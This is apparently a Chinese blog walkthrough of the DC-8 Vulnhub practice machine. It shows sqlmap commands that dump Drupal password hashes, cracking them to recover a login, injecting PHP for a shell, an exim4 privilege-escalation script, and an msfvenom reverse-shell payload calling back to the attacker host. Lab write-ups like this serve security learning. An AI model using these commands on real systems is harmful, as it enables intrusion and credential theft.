---
title: 'DC-8 : Walkthrough'
date: 2020-05-24T18:37:43+08:00
author: 2hanx
layout: post
categories:
  - Vulnhub
---
### 主机识别

`arp-scan -l`

### 网络拓扑

| 计算机       | IP              |
| --------- | --------------- |
| 本机（Win10） | `192.168.1.105` |
| Kali      | `192.168.1.112` |
| DC-8      | `192.168.1.108` |

### 扫描端口和版本信息

`nmap -A 192.168.1.108`

![1.png](https://i.loli.net/2020/05/24/mUYbfWJNcvtaVEq.png) 

### 访问 Web 并确定 Web 应用

根据 Nmap 扫描结果可知，Web 应用程序运行的是 **Drupal 7** CMS

![2.png](https://i.loli.net/2020/05/24/cWGVl63gUh8ybj2.png) 

经过 OSINT 查找得知该版本有许多漏洞，但是利用都不成功。

此外观察到导航栏选项链接与页面中的链接不一致，并且带有参数 `?nid=2` ，看到带查询参数，第一反应就是存在 SQL注入，经过简单验证可证明存在注入漏洞

![3.png](https://i.loli.net/2020/05/24/8xrMQ3fWTcqSONK.png) 

之后用 _sqlmap_ 工具进行 SQL 注入

<pre><code class="language-sql line-numbers">sqlmap -r post.txt --dbs --batch
sqlmap -r post.txt -D d7db --tables --batch
sqlmap -r post.txt -D d7db -T users --columns --batch
sqlmap -r post.txt -D d7db -T users -C "name,pass" --dump --batch
</code></pre>

![4.png](https://i.loli.net/2020/05/24/8aXg3IPdzHm6oUY.png) 

使用 _john_ 破解 hash 密码

![5.png](https://i.loli.net/2020/05/24/1n6fL4K8zmB3aeb.png) 

得到一个账户和密码：`john:turtle`。使用该账户登录系统，探索后发现在 _webform_ 的 _form settings_ 选项中可以插入 PHP 代码

### Getshell

![6.png](https://i.loli.net/2020/05/24/b94lIngovxjLQfV.png) 

切换到有填写表单的页面，随意输入一些信息后提交即可 getshell

![7.png](https://i.loli.net/2020/05/24/2MIsar7YpKCW4Pk.png) 

在 _/home/dc8user_ 目录下有个隐藏文件 `.google_authenticator`。因此该账户使用 ssh 登录时会有 2FA 认证

![8.png](https://i.loli.net/2020/05/24/R9BQe2CSqATiJ1j.png) 

> 查看下系统中安装的 Google 2FA ：`dpkg -l | grep google*`
> 
> <pre><code class="line-numbers">ii  libpam-google-authenticator   20160607-2+b1                  amd64        Two-step verification
</code></pre>
> 
> 在网上找到绕过 2FA 的几个[方法](https://shahmeeramir.com/4-methods-to-bypass-two-factor-authentication-2b0075d9eb5f) 

接下来我们查找具有 SUID 权限的工具

![9.png](https://i.loli.net/2020/05/24/mOeTEP1UMLh63Jv.png) 

其中 _exim4_ 比较可疑

![10.png](https://i.loli.net/2020/05/24/GfubaNgQPxEnyFi.png) 

搜索一下该软件漏洞

![11.png](https://i.loli.net/2020/05/24/XM6SK9tuDQNFRcs.png) 

### 提权

将该脚本传到虚拟机上后执行

> 更改下换行符：`sed -i "s/\r//" 46996.sh` 

![12.png](https://i.loli.net/2020/05/24/tk6lFMcGEBmyn1j.png) 

### 总结

1 . 插入 PHP 代码时，使用 _msfvenom_ 生成 **php** 反向 shell 代码： 

```
msfvenom -p php/reverse_php LHOST=192.168.1.112 LPORT=8888 -f raw -o recvshell.php
```

同时 Kali 端运行 msf

```
use exploit/multi/handler
set payload php/reverse_php
```

> `ctrl+z` 将会话放置到后台 

2 . 虽然知道 ssh 登录时会进行 2FA 认证，认证密码是 6 个数字，可以采取暴力破解。但是在输入认证密码之后仍然需要输入密码，因此想要绕过 2FA 难度较大

